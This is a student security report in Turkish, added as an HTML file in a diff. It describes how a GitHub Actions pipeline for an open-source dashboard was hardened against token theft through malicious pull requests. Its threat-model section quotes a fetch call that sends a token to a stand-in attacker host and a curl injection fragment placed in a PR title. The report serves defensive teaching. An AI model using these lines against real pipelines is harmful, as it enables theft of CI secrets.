@@ -1,0 +1,241 @@
+<!doctype html>
+<html lang="tr">
+<head>
+<meta charset="utf-8">
+<title>Güvenlik Raporu: Türkiye Açık Kaynak Radarı</title>
+<style>
+  @import url("https://fonts.googleapis.com/css2?family=Georama:wght@400;600;700&family=Roboto+Mono:wght@400;600&display=swap");
+  @page { size: A4; margin: 18mm 16mm 18mm 16mm; }
+  * { box-sizing: border-box; }
+  body { font-family: "Georama", sans-serif; font-size: 10.2pt; line-height: 1.45; color: #14171c; margin: 0; }
+  h1 { font-size: 22pt; margin: 0 0 6px; }
+  h2 { font-size: 14pt; margin: 22px 0 8px; padding-bottom: 4px; border-bottom: 2px solid #157a2a; break-after: avoid; }
+  h3 { font-size: 11pt; margin: 14px 0 6px; break-after: avoid; }
+  p { margin: 0 0 8px; }
+  code, .mono { font-family: "Roboto Mono", monospace; font-size: 8.8pt; }
+  table { width: 100%; border-collapse: collapse; margin: 6px 0 12px; font-size: 8.8pt; break-inside: auto; }
+  th, td { border: 1px solid #d5d9e0; padding: 4px 6px; text-align: left; vertical-align: top; }
+  th { background: #eef0f3; }
+  tr { break-inside: avoid; }
+  .num { text-align: center; white-space: nowrap; }
+  .cover { height: 245mm; display: flex; flex-direction: column; justify-content: space-between; break-after: page; }
+  .lights { display: flex; gap: 8px; margin-bottom: 18px; }
+  .lights i { width: 14px; height: 14px; border-radius: 50%; background: #ff6157; display: block; }
+  .lights i:nth-child(2) { background: #ffc030; } .lights i:nth-child(3) { background: #2acb42; }
+  .kicker { font-family: "Roboto Mono", monospace; color: #4b5563; font-size: 10pt; }
+  .meta td { border: 0; padding: 3px 12px 3px 0; font-size: 10pt; }
+  .meta td:first-child { color: #4b5563; width: 42mm; }
+  .box { border: 1px solid #d5d9e0; border-left: 4px solid #157a2a; border-radius: 4px; padding: 8px 10px; margin: 8px 0 12px; background: #f6f7f9; break-inside: avoid; }
+  .box.warn { border-left-color: #b45309; background: #fff8eb; }
+  .kpis { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; margin: 10px 0 14px; }
+  .kpi { border: 1px solid #d5d9e0; border-radius: 6px; padding: 8px; }
+  .kpi b { display: block; font-family: "Roboto Mono", monospace; font-size: 15pt; }
+  .kpi span { font-size: 8.5pt; color: #4b5563; }
+  .high { color: #8c1d18; font-weight: 600; } .mid { color: #6b4a00; font-weight: 600; } .low { color: #14532d; font-weight: 600; }
+  svg { width: 100%; height: auto; }
+  .page-break { break-before: page; }
+  ul { margin: 0 0 8px; padding-left: 18px; } li { margin-bottom: 2px; }
+  .small { font-size: 8.5pt; color: #4b5563; }
+</style>
+</head>
+<body>
+
+<section class="cover">
+  <div>
+    <div class="lights"><i></i><i></i><i></i></div>
+    <p class="kicker">BULUT BİLİŞİM VE SİBER GÜVENLİK · HAFTALIK SPRINT: GÜVENLİ BULUT YAYINI</p>
+    <h1>Güvenlik Raporu</h1>
+    <p style="font-size:14pt;margin-top:4px">Türkiye Açık Kaynak Radarı: CI/CD hattının sertleştirilmesi</p>
+  </div>
+  <table class="meta">
+    <tr><td>Öğrenci</td><td>Enes Altıparmak (2516016023)</td></tr>
+    <tr><td>Öğretim elemanı</td><td>Öğr. Gör. Osman Can Çetlenbik</td></tr>
+    <tr><td>Kurum</td><td>MCBÜ Manisa Teknik Bilimler MYO · Büyük Veri Analistliği</td></tr>
+    <tr><td>Rapor tarihi</td><td>29 Ekim 2026</td></tr>
+    <tr><td>Canlı ürün</td><td class="mono">acik-kaynak-radari.enesaltipsrmak.workers.dev</td></tr>
+    <tr><td>Depo</td><td class="mono">github.com/enesaltiparmak/acik-kaynak-radari</td></tr>
+    <tr><td>Öncelikli tehdit</td><td>Kötü niyetli bir pull request ile CI/CD hattının ele geçirilip gizli token'ın çalınması</td></tr>
+  </table>
+</section>
+
+<h2>1. Yönetici özeti</h2>
+<p>Türkiye Açık Kaynak Radarı, GitHub API'den her gün veri çekip kendi zaman serisini biriktiren statik bir pano. Ürünün en kritik varlığı, veri çekmek için kullanılan token ve bu token'ı çalıştıran GitHub Actions hattı. Kartımdaki öncelikli tehdit, kötü niyetli bir pull request'in bu hatta kod çalıştırıp token'ı dışarı sızdırması.</p>
+<p>Bu tehdide karşı hat beş katmanda sertleştirildi: en az yetkili workflow'lar, <code>pull_request_target</code> yasağı, commit SHA ile sabitlenmiş üçüncü taraf Actions, branch protection ile zorunlu inceleme ve harden-runner ile ağ çıkışının engellenmesi. Sertleştirmenin etkisi OpenSSF Scorecard ile önce ve sonra ölçüldü.</p>
+<div class="kpis">
+  <div class="kpi"><b>3.0 → 6.9</b><span>OpenSSF Scorecard</span></div>
+  <div class="kpi"><b>A+</b><span>Mozilla Observatory (145 puan)</span></div>
+  <div class="kpi"><b>A+</b><span>securityheaders.com</span></div>
+  <div class="kpi"><b>0 TL</b><span>Aylık maliyet</span></div>
+</div>
+<div class="box"><b>Sonuç:</b> Öncelikli tehdidin riski 20'den (yüksek) 4'e (düşük) indi. Kalan riskler: tek geliştirici olduğu için kod incelemesi zorunlu tutulamıyor (yönetici bypass'ı açık), ZAP taraması henüz yapılmadı ve Scorecard puanı bonus eşiği olan 7'nin 0.1 altında.</div>
+
+<h2>2. Mimari ve güven sınırları</h2>
+<svg viewBox="0 0 760 330" xmlns="http://www.w3.org/2000/svg" font-family="Georama, sans-serif" font-size="11">
+  <defs><marker id="a" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#4b5563"/></marker></defs>
+  <!-- güven bölgeleri: kutu rengiyle -->
+  <g font-weight="600">
+    <rect x="10" y="30" width="150" height="50" rx="25" fill="#fff" stroke="#14171c"/><text x="85" y="52" text-anchor="middle">Geliştirici /</text><text x="85" y="67" text-anchor="middle">dış katkıcı (PR)</text>
+    <rect x="205" y="30" width="155" height="50" rx="6" fill="#eef3fb" stroke="#1a56db" stroke-width="1.5"/><text x="282" y="52" text-anchor="middle">main dalı</text><text x="282" y="67" text-anchor="middle" font-size="9.5" font-weight="400" fill="#4b5563">korumalı · PR + inceleme</text>
+    <rect x="405" y="30" width="155" height="50" rx="6" fill="#f6f2fb" stroke="#7e22ce" stroke-width="1.5"/><text x="482" y="52" text-anchor="middle">Cloudflare Workers</text><text x="482" y="67" text-anchor="middle" font-size="9.5" font-weight="400" fill="#4b5563">statik site · CSP · HSTS</text>
+    <rect x="605" y="30" width="145" height="50" rx="25" fill="#fff" stroke="#14171c"/><text x="677" y="60" text-anchor="middle">Kullanıcı tarayıcısı</text>
+
+    <rect x="205" y="115" width="155" height="44" rx="6" fill="#eef7f0" stroke="#157a2a" stroke-width="1.5"/><text x="282" y="134" text-anchor="middle">ci · codeql · scorecard</text><text x="282" y="149" text-anchor="middle" font-size="9.5" font-weight="400" fill="#4b5563">salt okuma · sır yok</text>
+
+    <rect x="10" y="195" width="150" height="50" rx="25" fill="#fff" stroke="#14171c"/><text x="85" y="225" text-anchor="middle">GitHub GraphQL API</text>
+    <rect x="205" y="195" width="155" height="50" rx="6" fill="#eef7f0" stroke="#157a2a" stroke-width="1.5"/><text x="282" y="216" text-anchor="middle">snapshot job (günde 1)</text><text x="282" y="232" text-anchor="middle" font-size="9.5" font-weight="400" fill="#4b5563">contents: write · egress: block</text>
+    <rect x="405" y="195" width="155" height="50" rx="6" fill="#eef3fb" stroke="#1a56db" stroke-width="1.5"/><text x="482" y="216" text-anchor="middle">data dalı</text><text x="482" y="232" text-anchor="middle" font-size="9.5" font-weight="400" fill="#4b5563">latest.json · history.json</text>
+    <rect x="205" y="268" width="155" height="44" rx="6" fill="#fff8eb" stroke="#b45309" stroke-width="1.5"/><text x="282" y="287" text-anchor="middle">GitHub Secrets</text><text x="282" y="302" text-anchor="middle" font-size="9.5" font-weight="400" fill="#4b5563">GH_DATA_TOKEN (salt okunur)</text>
+  </g>
+  <g stroke="#4b5563" stroke-width="1.3" fill="none" marker-end="url(#a)">
+    <path d="M160 55 L203 55"/>
+    <path d="M360 55 L403 55"/>
+    <path d="M605 55 L562 55"/>
+    <path d="M282 80 L282 113"/>
+    <path d="M205 220 L162 220"/>
+    <path d="M360 220 L403 220"/>
+    <path d="M282 268 L282 247"/>
+    <path d="M560 220 L677 220 L677 82"/>
+  </g>
+  <g font-size="9.5" fill="#4b5563">
+    <text x="182" y="48" text-anchor="middle">PR</text>
+    <text x="382" y="48" text-anchor="middle">derleme</text>
+    <text x="583" y="48" text-anchor="middle">HTTPS</text>
+    <text x="290" y="101">her PR/push</text>
+    <text x="183" y="213" text-anchor="middle">okuma</text>
+    <text x="382" y="213" text-anchor="middle">push</text>
+    <text x="290" y="262" fill="#b45309">yalnız bu adıma</text>
+    <text x="685" y="160">fetch (CORS)</text>
+  </g>
+  <g font-size="9.5">
+    <rect x="430" y="270" width="10" height="10" fill="#eef7f0" stroke="#157a2a"/><text x="446" y="279">Sınır 1: Actions runner</text>
+    <rect x="590" y="270" width="10" height="10" fill="#eef3fb" stroke="#1a56db"/><text x="606" y="279">Sınır 2: GitHub deposu</text>
+    <rect x="430" y="290" width="10" height="10" fill="#f6f2fb" stroke="#7e22ce"/><text x="446" y="299">Sınır 3: Cloudflare</text>
+    <rect x="590" y="290" width="10" height="10" fill="#fff8eb" stroke="#b45309"/><text x="606" y="299">Gizli değer</text>
+  </g>
+</svg>
+<p class="small">Veri akışı: snapshot job salt okunur token'la API'den veri okur ve yalnız botun yazdığı <code>data</code> dalına yazar. Kod <code>main</code> dalından Cloudflare'e derlenir. Tarayıcı kodu Cloudflare'den, veriyi doğrudan <code>data</code> dalından okur. Hiçbir sır tarayıcıya veya derlemeye ulaşmaz. PR'lar yalnız sırsız CI'ı tetikler.</p>
+
+<h3>Bileşenler ve kod olarak altyapı</h3>
+<table>
+  <tr><th>Bileşen</th><th>Nasıl tanımlı</th><th>Yetki / neden</th></tr>
+  <tr><td>Cloudflare Workers (statik varlık)</td><td><code>wrangler.toml</code> (IaC), <code>public/_headers</code></td><td>Cloudflare GitHub uygulaması yalnızca bu depoya erişebilir; derlemeyi Cloudflare yapar, GitHub'da Cloudflare token'ı tutulmaz.</td></tr>
+  <tr><td>snapshot workflow</td><td><code>.github/workflows/snapshot.yml</code></td><td><code>contents: write</code>: yalnızca <code>data</code> dalına günlük veri commit'lemek için gerekli.</td></tr>
+  <tr><td>ci, codeql, scorecard</td><td><code>.github/workflows/*.yml</code></td><td><code>contents: read</code>; CodeQL/Scorecard'a ek olarak <code>security-events: write</code> (sonuç yükleme), Scorecard'a <code>id-token: write</code> (imzalı yayın).</td></tr>
+  <tr><td>GH_DATA_TOKEN</td><td>Portal (GitHub Secrets)</td><td>Hiçbir scope seçilmemiş klasik token: yalnızca herkese açık veriyi okur, 90 günlük. Yazma yetkisi yok.</td></tr>
+  <tr><td>Branch protection, secret scanning</td><td>Portal (GitHub ayarları)</td><td>Kod dışında tıklanarak kuruldu. Ekran görüntüsü Ekler'de.</td></tr>
+</table>
+
+<h2>3. Tehdit modeli (STRIDE)</h2>
+<p>Risk = Olasılık (1–5) × Etki (1–5). <span class="high">15+ yüksek</span>, <span class="mid">8–14 orta</span>, <span class="low">1–7 düşük</span>.</p>
+<table>
+  <tr><th>#</th><th>STRIDE</th><th>Tehdit</th><th class="num">Risk</th><th>Önlem</th><th class="num">Kalan</th></tr>
+  <tr><td><b>T1</b></td><td>I / E</td><td><b>Kötü niyetli PR ile CI/CD'nin ele geçirilip token'ın çalınması</b></td><td class="num high">4×5=20</td><td>Bölüm 3.1'deki beş katman</td><td class="num low">2×2=4</td></tr>
+  <tr><td>T2</td><td>Tampering</td><td>Üçüncü taraf Action'ın etiketi zararlı koda taşınır (tj-actions 2025 olayı)</td><td class="num high">3×5=15</td><td>Tüm <code>uses:</code> 40 karakter SHA; Dependabot ile güncelleme; CI politika kontrolü</td><td class="num low">1×5=5</td></tr>
+  <tr><td>T3</td><td>Tampering</td><td>Ele geçirilmiş hesap main'e zararlı kod push eder</td><td class="num mid">2×5=10</td><td>Branch protection, PR + CODEOWNERS, zorunlu CI, force push kapalı</td><td class="num low">1×5=5</td></tr>
+  <tr><td>T4</td><td>Tampering</td><td>data dalına sahte veri yazılır</td><td class="num low">2×3=6</td><td>Yalnız bot yazar; istemci şema doğrular ve metni <code>textContent</code> ile basar</td><td class="num low">2×2=4</td></tr>
+  <tr><td>T5</td><td>Spoofing</td><td>Siteyi iframe'e gömerek kullanıcıyı kandırma (clickjacking)</td><td class="num low">2×2=4</td><td><code>frame-ancestors 'none'</code>, <code>X-Frame-Options: DENY</code>, HSTS preload</td><td class="num low">1×2=2</td></tr>
+  <tr><td>T6</td><td>Info. disclosure</td><td>Depo açıklamasına konan HTML ile XSS</td><td class="num mid">3×3=9</td><td>CSP <code>script-src 'self'</code>, satır içi kod yok, DOM'a yalnız <code>textContent</code>; CodeQL</td><td class="num low">1×3=3</td></tr>
+  <tr><td>T7</td><td>DoS</td><td>GitHub API çöker veya hız sınırı dolar</td><td class="num mid">4×3=12</td><td>Son başarılı veri korunur; istemci önce canlı veri, sonra tarayıcı önbelleği, sonra yedek kopya; uyarı bandı</td><td class="num low">4×1=4</td></tr>
+  <tr><td>T8</td><td>Repudiation</td><td>Değişikliği kimin yaptığı bilinmez</td><td class="num low">2×2=4</td><td>Tüm değişiklikler commit/PR kaydında; bot commit'leri workflow çalıştırmasına bağlı</td><td class="num low">1×2=2</td></tr>
+  <tr><td>T9</td><td>Elevation</td><td>Bağımlılıkta zafiyet veya zararlı sürüm</td><td class="num mid">2×4=8</td><td>Sabit sürümler + lock dosyası, <code>npm ci --ignore-scripts</code>, npm audit, dependency review</td><td class="num low">1×4=4</td></tr>
+  <tr><td>T10</td><td>Info. disclosure</td><td><code>.env</code> dosyası yanlışlıkla commit edilir</td><td class="num mid">3×4=12</td><td><code>.gitignore</code>, push protection, CI'da gitleaks; token salt okunur</td><td class="num low">1×2=2</td></tr>
+</table>
+
+<h3>3.1 T1 ayrıntılı: kötü niyetli PR ile token hırsızlığı</h3>
+<p><b>Senaryo:</b> Saldırgan depoyu fork'lar, veri betiğine <code>fetch('https://saldirgan.example/?t=' + process.env.GH_TOKEN)</code> ekleyip PR açar. Workflow PR kodunu sırlarla çalıştırırsa token sızar. İkinci varyant: PR başlığına <code>"; curl … $GITHUB_TOKEN #</code> yazıp workflow içindeki satır içi <code>${{ github.event.pull_request.title }}</code> ifadesinden komut enjekte etmek.</p>
+<table>
+  <tr><th>Saldırı adımı</th><th>Önlem</th><th>Kanıt</th></tr>
+  <tr><td>Fork PR kodu sırlarla çalışır</td><td><code>pull_request_target</code> hiçbir workflow'da yok. Sır kullanan tek workflow PR ile tetiklenmez (yalnız <code>schedule</code> ve <code>workflow_dispatch</code>).</td><td><code>check-workflows.mjs</code> her CI'da kontrol eder</td></tr>
+  <tr><td>Zararlı kod main'e girer</td><td>Branch protection: PR, 1 onay, CODEOWNERS incelemesi, <code>build</code> + <code>secrets</code> kontrolleri zorunlu</td><td>Ayarlar ekran görüntüsü; push'ta "Changes must be made through a pull request" uyarısı</td></tr>
+  <tr><td>Token dışarı sızdırılır</td><td>harden-runner <code>egress-policy: block</code>: snapshot job yalnız <code>api.github.com</code> ve <code>github.com</code>'a bağlanabilir</td><td>29.10 çalıştırması bu politikayla başarılı oldu</td></tr>
+  <tr><td>Token ile depoya yazma</td><td>Varsayılan <code>permissions: {}</code>. Veri token'ı yazamaz. <code>persist-credentials: false</code>: push token'ı yalnızca push adımının <code>env</code>'inde</td><td>Scorecard Token-Permissions 0 → 10</td></tr>
+  <tr><td>Etiketi değiştirilmiş Action</td><td>Tüm Actions commit SHA ile sabit</td><td>Scorecard Pinned-Dependencies 0 → 10</td></tr>
+  <tr><td>Satır içi ifade enjeksiyonu</td><td>Kullanıcı kontrollü değer <code>run:</code> içine yazılmaz; sır kullanan workflow'un kullanıcı girdisi yok</td><td>CodeQL <code>actions</code> analizi temiz</td></tr>
+</table>
+
+<h2>4. Uygulanan kontroller</h2>
+<table>
+  <tr><th>Alan</th><th>Kontrol</th><th>Durum</th></tr>
+  <tr><td rowspan="5">Gizli anahtarlar ve CI/CD</td><td>Anahtar istemci kodunda, depoda ve log'da yok; GitHub Secrets'ta</td><td>✓ (depo ve derleme taraması: 0 eşleşme)</td></tr>
+  <tr><td>Workflow'larda <code>permissions</code> ile en az yetki</td><td>✓ 4/4 workflow</td></tr>
+  <tr><td>Secret scanning: gitleaks (CI) + GitHub secret scanning ve push protection</td><td>✓ gitleaks yeşil</td></tr>
+  <tr><td>Bağımlılık taraması: Dependabot, npm audit, dependency review</td><td>✓ 0 bilinen zafiyet</td></tr>
+  <tr><td>Branch protection, doğrudan push kapalı</td><td>✓ (yönetici bypass'ı açık, bkz. Kalan riskler)</td></tr>
+  <tr><td rowspan="4">Web uygulaması</td><td>HTTPS zorunlu, HSTS (1 yıl, preload)</td><td>✓</td></tr>
+  <tr><td>CSP: <code>default-src 'none'</code>, <code>unsafe-inline</code> ve <code>unsafe-eval</code> yok</td><td>✓ istisna yok</td></tr>
+  <tr><td>X-Content-Type-Options, Referrer-Policy, Permissions-Policy, frame-ancestors, COOP, CORP</td><td>✓</td></tr>
+  <tr><td><code>/.well-known/security.txt</code></td><td>✓ yayında</td></tr>
+  <tr><td>IaC</td><td><code>wrangler.toml</code> ile Cloudflare projesi; workflow'lar ve başlıklar kodda</td><td>✓</td></tr>
+</table>
+<p class="small">CSP'nin satır içi kod olmadan çalışabilmesi için yazı tipleri Google Fonts yerine projeyle birlikte yayımlanıyor, grafik kütüphanesi ayrı dosya olarak yükleniyor ve formlarda satır içi olay işleyicisi kullanılmıyor.</p>
+
+<h2>5. Test sonuçları</h2>
+<h3>5.1 OpenSSF Scorecard (kartın doğrulama testi)</h3>
+<p>Ölçüm: Scorecard v5.6.0 resmî Linux yayını (SHA-256 doğrulandı). <b>Önce</b>: 12 commit, tek ve sertleştirilmemiş workflow (<code>permissions: write-all</code>, <code>@v4</code> etiketleri). <b>Sonra</b>: 8 sertleştirme commit'i ve depo ayarları.</p>
+<table>
+  <tr><th>Kontrol</th><th class="num">Önce</th><th class="num">Sonra</th><th>Değişikliğin nedeni</th></tr>
+  <tr><td><b>Toplam</b></td><td class="num"><b>3.0</b></td><td class="num"><b>6.9</b></td><td></td></tr>
+  <tr><td>Token-Permissions</td><td class="num">0</td><td class="num">10</td><td><code>write-all</code> → <code>permissions: {}</code> + job bazında yetki</td></tr>
+  <tr><td>Pinned-Dependencies</td><td class="num">0</td><td class="num">10</td><td>Actions commit SHA ile sabitlendi</td></tr>
+  <tr><td>SAST</td><td class="num">0</td><td class="num">10</td><td>CodeQL (JavaScript + Actions)</td></tr>
+  <tr><td>Dependency-Update-Tool</td><td class="num">0</td><td class="num">10</td><td>Dependabot (npm + Actions)</td></tr>
+  <tr><td>Security-Policy</td><td class="num">0</td><td class="num">9</td><td><code>SECURITY.md</code> + <code>security.txt</code></td></tr>
+  <tr><td>License</td><td class="num">0</td><td class="num">10</td><td>MIT lisansı</td></tr>
+  <tr><td>Dangerous-Workflow, Binary-Artifacts, Vulnerabilities</td><td class="num">10</td><td class="num">10</td><td>Korundu; CI'daki politika kontrolüyle güvence altında</td></tr>
+  <tr><td>Code-Review</td><td class="num">0</td><td class="num">0</td><td>Tek geliştirici, commit'ler PR'sız</td></tr>
+  <tr><td>Branch-Protection</td><td class="num">–</td><td class="num">–</td><td>Ölçüm yazma yetkili token istiyor; veri token'ına bilinçli olarak verilmedi</td></tr>
+</table>
+
+<h3>5.2 Web güvenliği ve kalite</h3>
+<table>
+  <tr><th>Araç</th><th>Hedef</th><th>Sonuç (29.10.2026)</th></tr>
+  <tr><td>Mozilla Observatory</td><td>≥ B+</td><td><b>A+</b> · 145 puan · 12/12 test</td></tr>
+  <tr><td>securityheaders.com</td><td>≥ A</td><td><b>A+</b></td></tr>
+  <tr><td>Lighthouse mobil</td><td>Erişilebilirlik ≥ 90, Performans ≥ 80</td><td>Erişilebilirlik 100 · Performans 85 · En iyi uygulamalar 100 · SEO 100</td></tr>
+  <tr><td>CI politika kontrolü</td><td>0 ihlal</td><td>0 ihlal (pull_request_target, SHA, permissions, harden-runner)</td></tr>
+</table>
+
+<h3>5.3 OWASP ZAP baseline</h3>
+<div class="box warn"><b>Henüz yapılmadı.</b> ZAP baseline taraması yalnızca kendi ürün adresine yapılacak. Komut: <code>docker run --rm -t ghcr.io/zaproxy/zaproxy:stable zap-baseline.py -t https://acik-kaynak-radari.enesaltipsrmak.workers.dev</code>. Bulgular tablosu (bulgu, risk, düzeltme, durum) ve düzeltme sonrası ikinci tarama bu bölüme eklenecek.</div>
+
+<h2>6. İzleme ve olay müdahalesi</h2>
+<ul>
+  <li><b>Log'lar:</b> GitHub Actions çalıştırma log'ları (her snapshot), Cloudflare Workers istek ve hata gözlemleri, harden-runner ağ raporu.</li>
+  <li><b>Alarm 1, veri hattı:</b> Snapshot başarısız olursa job kırmızıya döner ve GitHub depo sahibine e-posta gönderir. Veri dosyasına <code>status: error</code> yazılır, sitede uyarı bandı görünür.</li>
+  <li><b>Alarm 2, bayat veri:</b> Veri 36 saatten eskiyse site kullanıcıya uyarı gösterir.</li>
+  <li><b>Runbook:</b> "API anahtarım sızdı" senaryosu için tespit → iptal → yenileme → inceleme → bildirim adımları <code>docs/RUNBOOK.md</code>'de. Token salt okunur olduğu için en kötü etki, hız sınırının başkası tarafından tüketilmesi.</li>
+</ul>
+
+<h2>7. Maliyet</h2>
+<table>
+  <tr><th>Kalem</th><th>Plan</th><th>Kullanım</th><th>Maliyet</th></tr>
+  <tr><td>Cloudflare Workers (statik varlık)</td><td>Free</td><td>Statik dosya istekleri ücretsiz ve sınırsız; Worker kodu çalışmıyor</td><td>0 TL</td></tr>
+  <tr><td>GitHub Actions</td><td>Herkese açık depo</td><td>Herkese açık depolarda standart runner dakikaları ücretsiz</td><td>0 TL</td></tr>
+  <tr><td>GitHub API</td><td>Ücretsiz</td><td>Günde ~75 GraphQL sorgusu (saatlik 5.000 sınırının çok altında)</td><td>0 TL</td></tr>
+  <tr><td colspan="3"><b>Toplam aylık tahmin</b></td><td><b>0 TL</b></td></tr>
+</table>
+<p><b>Bütçe kontrolü:</b> Cloudflare ücretsiz planına ödeme yöntemi eklenmedi, bu yüzden ücretli kullanıma geçmek mümkün değil. GitHub'da Actions harcama limiti 0 $ (varsayılan). Bu iki ayarın ekran görüntüsü Ekler'de bütçe alarmı kanıtı olarak yer alır.</p>
+
+<h2>8. Kalan riskler</h2>
+<table>
+  <tr><th>Risk</th><th>Neden kabul edildi / sonraki adım</th></tr>
+  <tr><td>Yönetici bypass'ı açık (Code-Review = 0)</td><td>Tek geliştirici kendi PR'ını onaylayamıyor. İkinci bir inceleyici eklenince "Do not allow bypassing" açılacak.</td></tr>
+  <tr><td>Hesabın ele geçirilmesi</td><td>Tüm kontroller hesap sahibine güveniyor. 2FA (tercihen passkey) zorunlu tutulmalı.</td></tr>
+  <tr><td>Veri token'ı klasik PAT</td><td>Fine-grained token yıldız verisine erişemediği için klasik token denendi; scope'suz olduğundan yalnız herkese açık veriyi okur. Yıldız geçmişi API'den tamamen kaldırıldığı için fine-grained token'a geri dönülebilir.</td></tr>
+  <tr><td>raw.githubusercontent.com'a bağımlılık</td><td>Erişilemezse tarayıcı önbelleği ve siteyle gelen yedek veri devreye girer. Kullanıcıya açıkça söylenir.</td></tr>
+  <tr><td>ZAP taraması yapılmadı</td><td>Bölüm 5.3'te belirtildiği gibi yapılacak.</td></tr>
+</table>
+
+<h2>Ekler (ekran görüntüleri)</h2>
+<p class="small">Ödev gereği tüm ekran görüntülerinde tarih ve saat görünmelidir.</p>
+<ol class="small">
+  <li>Branch protection ayarları (Settings → Branches)</li>
+  <li>Secret scanning ve push protection (Settings → Code security)</li>
+  <li>GitHub Secrets'ta <code>GH_DATA_TOKEN</code> (değer görünmeden)</li>
+  <li>Mozilla Observatory A+ ve securityheaders.com A+ sonuç sayfaları</li>
+  <li>Başarılı snapshot çalıştırması ve harden-runner raporu</li>
+  <li>Cloudflare plan / GitHub harcama limiti (bütçe kontrolü)</li>
+  <li>ZAP önce/sonra raporları</li>
+</ol>
+</body>
+</html>
